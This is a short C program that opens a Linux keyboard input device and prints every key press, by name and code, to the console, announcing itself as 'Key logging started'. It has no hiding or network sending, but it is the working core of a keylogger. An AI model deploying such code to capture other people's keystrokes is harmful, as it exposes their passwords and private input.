#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>

#define nEVENTS 256
#define MAX_KEYS 256

typedef struct input_event input;

char search_input_device();

typedef struct {
  int fdsc;
  input *keys;
  char *file;
} KEYBOARD;

extern char *search_keyboard();
extern char *get_key_name(int);

int main(void){
  int i, read_len, key_code, run = 1;
  char *key_name;
  KEYBOARD keyboard;
  keyboard.keys = (input *)malloc(sizeof(input) * nEVENTS);
  if((keyboard.file = search_keyboard()) == NULL){
    printf("[ERROR] No keyboard file found\n");
    return 1;
  }
  if((keyboard.fdsc = open(keyboard.file, O_RDONLY)) < 0){
    printf("[ERROR] File open failed\n");
    return 1;
  }
  printf("[INFO] Key logging started\n");
  while(run){
    read_len = read(keyboard.fdsc , keyboard.keys, sizeof(input) * nEVENTS);
    for(i = 0; i < (read_len / sizeof(input)); i++){
      if(keyboard.keys[i].type != EV_KEY){
        continue;
      }
      if(keyboard.keys[i].value != 1){
        continue;
      }
      key_code = keyboard.keys[i].code;
      key_name = get_key_name(key_code);
      printf("[INFO] press %s(%d)\n", key_name, key_code);
      free(key_name);
    }
  }
  close(keyboard.fdsc);
  return 0;
}
